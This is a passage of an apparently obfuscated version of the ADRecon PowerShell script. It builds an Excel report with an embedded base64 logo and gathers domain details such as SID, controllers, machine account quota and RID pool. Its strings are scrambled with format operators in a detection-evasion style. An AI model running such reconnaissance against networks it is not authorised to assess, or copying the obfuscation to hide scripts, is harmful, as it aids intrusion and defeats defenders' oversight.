            Get-ADRExcelChart -ChartType ("{1}{3}{2}{0}"-f 'ed','x','Cluster','lBar') -ChartLayout 1 -ChartTitle ("{5}{2}{1}{0}{3}{4}{6}" -f 'e','s','s of U','r',' Ac','Statu','counts') -RangetoCover ("{1}{0}"-f '1:L43','F2') -ChartData $workbook.Worksheets.Item(1).Range(("{2}{0}{1}"-f':G','18','F2:F18,G2'))
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(20,6) , "" , ("{2}{1}{0}" -f '1','A','Users!'), "", ("{0}{1}{2}" -f 'Raw',' ','Data')) | Out-Null

            $workbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
        }

        # Create Table of Contents
        Get-ADRExcelWorkbook -Name ("{0}{2}{1}{3}" -f 'Table ','C','of ','ontents')
        $worksheet = $workbook.Worksheets.Item(1)

        $excel.ScreenUpdating = $false
        # Image format and properties
        # $path = "C:\ADRecon_Logo.jpg"
        # $base64adrecon = [convert]::ToBase64String((Get-Content $path -Encoding byte))

		$base64adrecon = ("{64}{110}{42}{108}{41}{29}{120}{34}{119}{14}{113}{7}{44}{124}{4}{6}{71}{97}{104}{37}{46}{2}{88}{103}{77}{69}{31}{81}{32}{107}{0}{94}{22}{127}{118}{78}{10}{19}{58}{57}{49}{13}{106}{87}{91}{18}{89}{83}{115}{102}{112}{114}{16}{50}{82}{3}{62}{86}{11}{80}{36}{111}{28}{125}{51}{123}{30}{98}{21}{63}{126}{67}{85}{25}{33}{48}{99}{109}{1}{66}{95}{84}{38}{92}{53}{43}{5}{93}{72}{26}{101}{61}{76}{52}{59}{122}{12}{121}{23}{9}{70}{79}{56}{105}{116}{45}{73}{68}{17}{55}{27}{75}{15}{39}{100}{8}{74}{35}{24}{54}{60}{20}{65}{47}{90}{40}{96}{117}" -f 'COFTQCVjF','sBEQAhM','AAmZmAADypwAADVkAA','u4+Cf8Q2bePdL7eNunUH4J/xCa9u+d79eOSRcqvBX+0+f9+9n/wBqfjv/ABp+Ev8Aa34v/wBrXgr/AGnz/v8Awl/tb8X/AO1p2XKN3ut7DYqJqbS4ltZtqudsnjvp9hvVcnwy903CVXbwpe2ttZTGsu1bgZl72LRN/t9/c2jTH4bUnk+GXvYtE3+339zaNMfhtSeT4Ze6qt4N02y6sr9HJ8Mu','ABzAFIARwBCACAAYgB1AGkAbAB0AC0AaQBuAAB','sJfikYEjw004pmkDMoycNP2EPd/wDoXyDHO35E8Z3/AMEkjRPmgISKSSTrTLm8yppKfM//AI','tbHVjAAAAAAAAAAEAAAAMZW5VUwAAADIAAAAcAE4Abw','AAUAAAABOd3RwdAAAAZAAAAAUY2hhZAAAAaQAAAAsclhZWgAAAdAAAAAUYlhZWgAAAeQAAAAUZ1hZWgAAAfgAAAAUclRSQwAAAgwAAAAgZ1RSQwAAAiwAAAAgYlRSQwAAAkwAAAAgY2hybQAAAmwAAAAkbWx1Y','nALJVOBE9euaWIJ4PO9VeYEik9qQAc','OcZYrBhDkYMyzYGSPSZbPLTi/KSt04vylo64+khMj01aW7f/wP/9oACAE','AkKGRooKSo4OTpISUpXWFlaZ2hpand4eXqGh4iJipCWl5iZmqClpqeoqaqwtba3uLm6wMTFxsfIycrQ1NXW19jZ2uDk5ebn6Onq8/T19vf4+fr/xAAfAQADAQEBAQEBAQEBAAAAAAA','EeGPEbbEmA+6ndfFJHL7ZafaLt5fbKIkmkYyUhxi5IHPlIqJYeWJ+9NV9ri/E74sDc22P4Cw/Ex/Gg3Jn+JEq091M7Y','zzzzzzz/wD/APP/AD/wKnmaoBooIKgvfeTw8W/lljjYE0YOWwgCijjT9','Wl5iZmqCjpKWmp6ipqrCys7S1tre4ubrAwsPExcbHyMnK0NPU1dbX2Nna4OL','ANwAOYWNzcEFQUEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPbWAAEAAAAA0','/wAPa0gcVkonCuMUypAY/FHmQQOT192AsGoHUfx/w','DEuRSPD22FH9Hdre82kVruGxbTb3cX9Hdre77JZW9kpKknw9tMO4W2zbXFc3afDe2qO+2aL','fl/yvg/8A2XlD2XXGsrKPCQMa0rQehwF2fFaq0','HDggIDh4UERQeHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4','BAgADBA','2P+','s09tw25XnRQNXB/Z7R/Itf9kO5T6lqV70NT6M7VyuqPpz7XI/lMq','ESyg/Em','QLuXISvrdiTi4','5NSPikLWeSGF48lkBc8GHOx7v','82i73CVPvYPEtKriaNRTw1ftx/i5LOKWtqD0D4drhE8yUFXCrWR+00Wd/L','r1c2lCENUOdU','VaIpDT7f8AHNEibhMhqaRA7wmOQRP/ABwNxwweWEviqi81iPGNihoDyNN3jEgxETAeqIQ5R0x6mlAV8','YqlStWE3A','ZjwCyBOmACZjs+EJ+/+IC','E8C','AAAAKPXAABUewAATM0AAJmaAAAmZgAAD1z/wg','ABgcICQoL/8QAw','/FKcC1CyoYaaUZRDJihR6mFLXHkRrq/bj/FqFlQw0FKMohkxQ','GSUxFAAEBAAACkGxjbXMEMAAAbW50clJHQiBYWV','NXKRJ4vgB6/n/hEfxRFkg8','z7jufcROn3P6IlRtBpJv9g//aAAgBAhEBPwH9gEz+L83ICZgO04+XLL7LDs2i7Yy+2y+/HT34pmALRniykIi05ohBsW5pbY2Emo/hQblFyn7XJ/CRd1Nz/gfbmR5cgrGhl/EDk/CWf8IMogQcf4AmFm2k4ObtjjpnHcKZRsO3ii+z/V28UX2f6px2EYf6soCQpIsUxG0V+wf/2gAIAQEABj8C/wB/tGpe7x8uJQ6CpyXEUJ91r','AAC3kAAAGN5wYXJhAAA','v7Nf5TzeBygj8rzNkKfNBoEFJFi5IKcT+aDEIAJ/F9SyEUGgQUkWLkgp','7q8Dr/RcwB8fzUGQdb7sQxlJsSzHFm/OECZlizBl7rrKRCY','v/AN','AAAABDUHYz','XhpZgAATU0AKgAAAAgAAgESAAMAAAABAAEAAIdpAAQAAAABAAAAJgAAAAAAAqACAAQAAAABAAAA6qADAAQAAAABAAAARgAAAAD/7QA4UGhv','f/AMHufCD+rAxmaP6lIXmKqus1Uh','wAAAAAAAAABAAAADGVuVVMAAA','jm','AAAADAAA','syslwhDgfdXi1yILMcX/AOt/1RwRw5','o9TClrjyI11ftx/i89uUM','kVUkiei0ggJChgZGigpKjc4OTpGR0hJSlVWV1hZWmRlZmdoaWpzdHV2d3h5eoCDhIWGh4iJipCTlJW','HcO2x7Sb+Pft2F9BZ3v6UsxZGw8QeO/8afhL/a14v/2teBxlZSeFFqXuu5BFk/BCQqyX4WlUvadgXZXvi7/a14LA9wnUrn5Ke0a7p456brJT8J6714v/ANrXgc0svEG8JvkeEyf014v/ANrXbwPQWS942ML2vc','+TX/aLjkWClFD1Hg1lKgRiODGKFEV1oGkm71p+0GqW2mMsnkkGropJB+LGKF','EL4Dj/wAKobHbKCiRSfmkbjB4qoMBQeFqHm7wA93/ABCg0APC1Dzd4Ae7/iMIEaEN6lrDn','Yoh7v7f+','+xV/Jf8AgEz/AB58uqnveZDnKiJFEfDKtIjTK5o+GzFtwBcE8','RSGn2pbjhg8sJfFVg5KxHjGtB6HAXZjit','Lwpb','IcBAAIRAxASIQQgMUETBTAiMlEUQAYzI2FCFXFSNIFQJJGhQ7EWB2I1U/DRJWDBROFy8ReCYzZwJ','UGBwgJCgv/xADDEQACAgEDAwMCAwUCBQIEB','/EJbEGpyv5QQ0qls9soOJFp+aJwqa','ji81AkZB9ySk2hBPIWfi/8A0P8AusW0BlGPd/f/AMqPT7uNWPd/x/u/7Xld8','/8/SX9r/P/wCE3Sf5Tz/+C3CCwfJ4qyYPPLX50p','/k2mzt7u4lupvCl7a21lMay+GporfdfE08Vxuv8Av9//2gAIAQMR','984lpnVcCQDya/7Id1p5/1NfUfaL9ou3r+24MdOl+0fxcdddGv','/9j/4AAQSkZJRgABA','B1e8d380Cvt/K/4byv8AgPV/xfuwe6J4A1B50VbxhwHPqtRLE8rzYCoSCYHm','UFRYXGBkaGxwfD','f9TnVeSyKQdA5N0GPIkNRrr2uvn/U1/wAYk9o+b/xmT8XlIoqPqXdf7fk1/wBo9rf+27f+z2','PGBeRPqi9cvQc40E7gNJ4rfuw+P+/i56/5H/IfH/Iv+b/8Ag/fxf8X4f8Mf4rz/AMDw8HXTEcFloORd/T7pZHfaZmi','mYAAPKnAAANWQAAE9AAAApbcGFyYQAAAAAAAwAAAAJmZgAA8qcAAA1ZAAAT0AAACltjaHJtAAAAAAADA','C','AgAGMAbwBwAHkAcg','5/58ljT','PVVURhgv/ANb/AKs7xoQo4je71TziphgrU','jflf/AKupa5p//SyEks4/4Lp/Yq3RKOZ4oMQ6/ujHkYeQVRnWAiEnV','ssz','b0xhXcHk8cUy6Qun/','MAAAACZ','VXWklcOF8tNGdoDjR1Zmt','EQE/EP8A7rwzk+pkCXCwYdPmR35','ypEqd','ARCABGAOoDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAwIEAQU','tquLzd/wDjLvHf+NPZ7OXbTv8AdxX','e','J/wAQTSvdf8TyMYzwVkAjDRDKZfoqYxJf/wBDP0v8390/hf8AP+7+mv7f+f8An4VPrihzizy','j+Ra/7Id18/wCpr/tFx/Itf9kdo+d+7y6mI9nlAjWOujJPmxLCrFY','AT8B/YD','BQYHDAgHBwcHDwsLCQwRDxISEQ8RERMWHBcTFBoVEREYIRgaHR0fHx8TFyIkIh4kHB','BPQAAAKW3BhcmEA','eHh4eHh4eHh4eHh4eHh4eHh4eHv/aAAwDAQACEQMRAAAB8w2n2fNjTqjTqjTqjTqjTqjTqjTqjbVttW21bTqjbVtOqNtWnFj2dP3RuXfy/wBc8p7JltuB5/0A3n/ovL93R63zjqgeYbdbzW2TafWaxH84lRtc2+9ZJjp5Fry8deGn12oVvOJV2jpxMdh2CN5BF9Q6LPWcn63m3LWtzY4bedXiFuvm/W8l32ubDq+E7nJw1WZVx/rPk3rDqO08uCjX3UeW+pkeYAIHfO27PjOyy0856zketdVdXynU46c4HlundF8d2PHsHnZcDmEummZfVLzw/Ya+vcNzWZd6P5xnUvWcdqu0U+r1xXkGze8RT7RPXF','Di9XZ0Xbx5ZPxQ7mpQN4IjjiiVjpSTs/1XCJophMP6sBvmXzJXjzf/AK3/AFRKxk5J2f6rhE0UwmH9WA3zL5krx5','4fHv/bAEMBBQUFBwY','xP5v+L/dUHiER0/VjguHOfd/xf7qDEIAJ/F9SaEVf1wO+X2Dt/fd9X2Boc4s/9D4HIJnurZYZPTKL52bJlJ','OPgBJ/F4dw9tlxp0b+9/a/tv','zXwk3OiU','REOHxIDBAUGBwgJCgsMDQ4P/aAAgBAQABPyH/APXoQHLfFhkC0kH51UGYQeaOGZH','b/AKsblVUay79Ua2pCiMvHu/8A1v8Aqr0wehckJV1nQIw4uzs63js1Q4djQ/j','BpAGcAaAB0ACwAIAB1AHMAZQAgAGYAcgBlAGUAbAB5AAAAAFhZWiAAAAAAAAD21gA','dHRN0Sfgpqt4ySkDz7rnEuHKPBothEU8o8fVx7OEc','E6pIalbzKkrS','XNJaE','KYEHmNb9Hg4+v8AiRzqhxCj9n/g/dayb+zX+U8','Uu+8842il6DmsR03MTqjbFdtq22rbattq22rbattq22rbattq22rbattq22r/2gAIAQEAAQUC/wB/o1O0bfFDJuVhLGvbY0y393t+w2quT4Ze5WEsa34U2+0vLYweGQdxtNomtbmCW3l/1FD+98Zf7Sty/wCMP2f/AGp+O/8A','AAAAAA','BAAAAANMtc2YzMgAAAAAAAQxKAAAF4///8yoAAAebAAD9h///+6L///2jAAAD2AAAwJRYWVogAAAAAAAAb5QAADjuAAADkFhZWiAAAAAAAAAknQAAD4MAALa+WFlaIAAAAAAAAGKl','QUI5KBt8GP7WoSHObUOp2Mh8yLHUIy2z8kAhghPyjinHx976E4yP2mI','j5OXm5+jp6vLz9PX29/j5+v/bAEMABQMEBAQDBQQEBAUF','xAAAQMDAgQDBAYEBwYECAZzAQIAAxEEEiEFMRMiEAZBUTIUYXEjB4EgkUIVoVIzsSRiMBbBctFDkjSC','dG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAA','aIq/bj/FmfbJEC5HCj50ysl+ruETypQVcKtZHq0STLCE04lqkhWFooNR/v+//xAAzEAEAAwACAgICAgMBAQAAAg','QAASABIAAD/4QBMR','0K8qOGN','GntV5Juad9s0WO4eCv8','y1sY21zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALZGVzYwAAAQgAAAA4Y3BydAA','AafP+/wDCqVI3bxYpKt5hiXIpHh7bCjd9ksreyUlST','QbN+h6bznMPXmHmG','2Bl8r6QDitJflIwPi/oItnX0sIjA4It+rv5w7GHJgfOlfDgfOlfDiA3k+bB5TfGUf5OwB8f/gf/9oACAEBAAE/EP8A9P6uHOf3U76uX7rzzUI/5neXPN54/wCH/wChCDKAHlqdxZ8nuR6rm8UORxF9Q','1YTeP6sSkz/VVFL/fN/vn/vcwXuYokcFH/oxZs13/ALNd/wCrNn0ZxSPBZ2Xfn/8AAv1Zs+j/APT/AP/Z','w4idFN2Wz','ogB+IAAwAbAAU','oElDQ19QUk9','T9yxgAg/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/8QAMxEBAQEAAwABAgUFAQEAAQEJAQARITEQQVFhIHHwkYGhsdHB4fEwQFBgcICQoLDA0OD/2gAIAQMRAT8Qsss/+gc3K+g2YqNujmNntBcY4JE21uQkNwSJtkl0UopDkyNYE+seLEtlyjlvq','M+BH/6+P/aAAwDAQACEQMRAAAQ7','EV1oGkm71p+0H/jn+9BmC3VzE0+bkVeLVCQdK6P/HP96DVLbTGWTySDV0UCD8XNJIpQKOFHLHdFUS','AcAAAAH','TGTwqX7cf4uSeKE+616FeVO0y7mPLEuhXH+LKNsxXc+QHF8uZBQr0P+o0fN2v8At+Tj+Qdv/bcH9ntHtEwAipxHFqt4ySkDzd1/t','+yHcn0P9TEKYeXgrj6uPXyLX/ZHe5J4ZMg2+oOvQ0xW0OMnkcXF/kuD+x2j3W4pyKeXFqnhriR5u6+','VDZklHTCYNKEoxh')

        $bytes = [System.Convert]::FromBase64String($base64adrecon)
        Remove-Variable base64adrecon

        $CompanyLogo = -join($ReportPath,'\',("{0}{2}{1}{3}{4}" -f 'A','Rec','D','on_Logo.jp','g'))
		$p = New-Object IO.MemoryStream($bytes, 0, $bytes.length)
		$p.Write($bytes, 0, $bytes.length)
        Add-Type -AssemblyName System.Drawing
		$picture = [System.Drawing.Image]::FromStream($p, $true)
		$picture.Save($CompanyLogo)

        Remove-Variable bytes
        Remove-Variable p
        Remove-Variable picture

        $LinkToFile = $false
        $SaveWithDocument = $true
        $Left = 0
        $Top = 0
        $Width = 150
        $Height = 50

        # Add image to the Sheet
        $worksheet.Shapes.AddPicture($CompanyLogo, $LinkToFile, $SaveWithDocument, $Left, $Top, $Width, $Height) | Out-Null

        Remove-Variable LinkToFile
        Remove-Variable SaveWithDocument
        Remove-Variable Left
        Remove-Variable Top
        Remove-Variable Width
        Remove-Variable Height

        If (Test-Path -Path $CompanyLogo)
        {
            Remove-Item $CompanyLogo
        }
        Remove-Variable CompanyLogo

        $row = 5
        $column = 1
        $worksheet.Cells.Item($row,$column)= ("{1}{3}{4}{0}{2}" -f'nten','Table ','ts','of',' Co')
        $worksheet.Cells.Item($row,$column).Style = ("{1}{2}{0}" -f' 2','H','eading')
        $row++

        For($i=2; $i -le $workbook.Worksheets.Count; $i++)
        {
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item($row,$column) , "" , "'$($workbook.Worksheets.Item($i).Name)'!A1", "", $workbook.Worksheets.Item($i).Name) | Out-Null
            $row++
        }

        $row++
		$workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item($row,1) , ("{1}{9}{7}{4}{8}{10}{2}{3}{6}{5}{0}" -f 'on','h','a','d','ithu','econ/ADRec','r','//g','b.co','ttps:','m/'), "" , "", ("{1}{6}{5}{0}{4}{2}{3}" -f'a','gith','ADR','econ','drecon/','.com/','ub')) | Out-Null

        $worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null

        $excel.Windows.Item(1).Displaygridlines = $false
        $excel.ScreenUpdating = $true
        $ADStatFileName = -join($ExcelPath,'\',$DomainName,("{2}{0}{3}{1}" -f'ort','xlsx','ADRecon-Rep','.'))
        Try
        {
            # Disable prompt if file exists
            $excel.DisplayAlerts = $False
            $workbook.SaveAs($ADStatFileName)
            Write-Output ('[+]'+' '+'Excelsh'+'ee'+'t'+' '+'Sa'+'ved'+' '+'t'+'o: '+"$ADStatFileName")
        }
        Catch
        {
            Write-Error "[EXCEPTION] $($_.Exception.Message) "
        }
        $excel.Quit()
        Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet -Final $true
        Remove-Variable worksheet
        Get-ADRExcelComObjRelease -ComObjtoRelease $workbook -Final $true
        Remove-Variable -Name workbook -Scope Global
        Get-ADRExcelComObjRelease -ComObjtoRelease $excel -Final $true
        Remove-Variable -Name excel -Scope Global
    }
}

Function Get-ADRDomain
{
<#
.SYNOPSIS
    Returns information of the current (or specified) domain.

.DESCRIPTION
    Returns information of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ("{0}{1}" -f 'A','DWS'))
    {
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ("{12}{4}{11}{9}{3}{1}{5}{2}{10}{8}{6}{0}{7}"-f'x','Domain]','o','R','et',' Error getting D','te','t','n','D','main Co','-A','[G')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        If ($ADDomain)
        {
            $DomainObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            $FLAD = @{
	            0 = ("{2}{1}{3}{0}"-f'000','ind','W','ows2');
	            1 = ("{3}{1}{0}{4}{2}" -f'0','indows20','nterim','W','3/I');
	            2 = ("{2}{0}{1}{3}" -f'ws20','0','Windo','3');
	            3 = ("{0}{2}{1}"-f'Wind','008','ows2');
	            4 = ("{0}{3}{2}{1}" -f'Wi','008R2','2','ndows');
	            5 = ("{3}{2}{0}{1}" -f '201','2','ndows','Wi');
	            6 = ("{3}{2}{0}{4}{1}" -f'ws201','2','o','Wind','2R');
	            7 = ("{2}{0}{1}"-f'n','dows2016','Wi')
            }
            $DomainMode = $FLAD[[convert]::ToInt32($ADDomain.DomainMode)] + ("{0}{2}{1}"-f 'D','ain','om')
            Remove-Variable FLAD
            If (-Not $DomainMode)
            {
                $DomainMode = $ADDomain.DomainMode
            }

            $ObjValues = @(("{0}{1}" -f'N','ame'), $ADDomain.DNSRoot, ("{0}{1}" -f 'NetBI','OS'), $ADDomain.NetBIOSName, ("{1}{4}{0}{2}{3}"-f 'l L','F','e','vel','unctiona'), $DomainMode, ("{1}{0}{2}" -f'SI','Domain','D'), $ADDomain.DomainSID.Value)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}"-f 'Ca','teg','ory') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'lue','Va') -Value $ObjValues[$i+1]
                $i++
                $DomainObj += $Obj
            }
            Remove-Variable DomainMode

            For($i=0; $i -lt $ADDomain.ReplicaDirectoryServers.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}"-f'e','Cat','gory') -Value ("{3}{2}{4}{0}{1}"-f'l','er','n Con','Domai','trol')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'e','Valu') -Value $ADDomain.ReplicaDirectoryServers[$i]
                $DomainObj += $Obj
            }
            For($i=0; $i -lt $ADDomain.ReadOnlyReplicaDirectoryServers.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}" -f 'tegory','a','C') -Value ("{4}{3}{1}{0}{2}"-f 'ly Domain','d On',' Controller','ea','R')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'ue','Val') -Value $ADDomain.ReadOnlyReplicaDirectoryServers[$i]
                $DomainObj += $Obj
            }

            Try
            {
                $ADForest = Get-ADForest $ADDomain.Forest
            }
            Catch
            {
                Write-Verbose ("{11}{10}{5}{0}{3}{1}{2}{7}{4}{9}{6}{8}" -f'r',' ','For','ror getting','C','omain] E','nt','est ','ext','o','D','[Get-ADR')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            If (-Not $ADForest)
            {
                Try
                {
                    $ADForest = Get-ADForest -Server $DomainController
                }
                Catch
                {
                    Write-Warning ("{3}{6}{1}{5}{4}{0}{2}{7}{8}" -f'rror g','t','ett','[','in] E','-ADRDoma','Ge','ing Forest Co','ntext')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }
            If ($ADForest)
            {
                $DomainCreation = Get-ADObject -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.Name)))" -Properties whenCreated
                If (-Not $DomainCreation)
                {
                    $DomainCreation = Get-ADObject -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.NetBIOSName)))" -Properties whenCreated
                }
                Remove-Variable ADForest
            }
            # Get RIDAvailablePool
            Try
            {
                $RIDManager = Get-ADObject -Identity "CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName) " -Properties rIDAvailablePool
                $RIDproperty = $RIDManager.rIDAvailablePool
                [int32] $totalSIDS = $($RIDproperty) / ([math]::Pow(2,32))
                [int64] $temp64val = $totalSIDS * ([math]::Pow(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName) "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            If ($DomainCreation)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f 'ry','atego','C') -Value ("{2}{0}{1}"-f 'io','n Date','Creat')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Valu','e') -Value $DomainCreation.whenCreated
                $DomainObj += $Obj
                Remove-Variable DomainCreation
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}" -f 'Ca','gory','te') -Value ("{6}{2}{4}{3}{0}{1}{5}" -f'cc','ountQ','D','MachineA','S-','uota','ms-')
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'Va','lue') -Value $((Get-ADObject -Identity ($ADDomain.DistinguishedName) -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota')
            $DomainObj += $Obj

            If ($RIDsIssued)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}"-f 'ry','Cat','ego') -Value ("{1}{0}{2}" -f's Issue','RID','d')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'alue','V') -Value $RIDsIssued
                $DomainObj += $Obj
                Remove-Variable RIDsIssued
            }
            If ($RIDsRemaining)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}"-f 'Cat','ego','ry') -Value ("{3}{4}{1}{0}{2}"-f'i','ain','ng','R','IDs Rem')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'e','Valu') -Value $RIDsRemaining
                $DomainObj += $Obj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If ($Method -eq ("{1}{0}" -f 'DAP','L'))
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{1}{0}" -f 'omain','D'),$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning ("{4}{5}{9}{6}{7}{3}{0}{8}{1}{2}"-f 'rror','g D','omain Context','E','[Ge','t-ADRDom','n','] ',' gettin','ai')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext
            # Get RIDAvailablePool
            Try
            {
                $SearchPath = ('C'+'N='+'RID '+"Manager$,CN=System")
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath.PropertiesToLoad.AddRange((("{3}{2}{0}{1}"-f 'lablepoo','l','ai','ridav')))
                $objSearcherResult = $objSearcherPath.FindAll()
                $RIDproperty = $objSearcherResult.Properties.ridavailablepool
                [int32] $totalSIDS = $($RIDproperty) / ([math]::Pow(2,32))
                [int64] $temp64val = $totalSIDS * ([math]::Pow(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable SearchPath
                $objSearchPath.Dispose()
                $objSearcherPath.Dispose()
                $objSearcherResult.Dispose()
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName) "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{2}{0}{1}"-f's','t','Fore'),$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            Catch
            {
                Write-Warning ("{1}{9}{8}{4}{10}{0}{2}{6}{7}{5}{3}"-f'm','[','ain] Err','t Context','AD','tting Fores','o','r ge','-','Get','RDo')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            If ($ForestContext)
            {
                Remove-Variable ForestContext
            }
            If ($ADForest)
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
            }
            If ($GlobalCatalog)
            {
                $DN = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($($DN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                    $ADObject.Dispose()
                }
                Catch
                {
                    Write-Warning "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
                }
            }
            Else
            {
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            Try
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
                $DN = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($DN)
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                $ADObject.dispose()
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
            # Get RIDAvailablePool
            Try
            {
                $RIDManager = ([ADSI]"LDAP://CN=RID Manager$,CN=System,$($objDomain.distinguishedName) ")
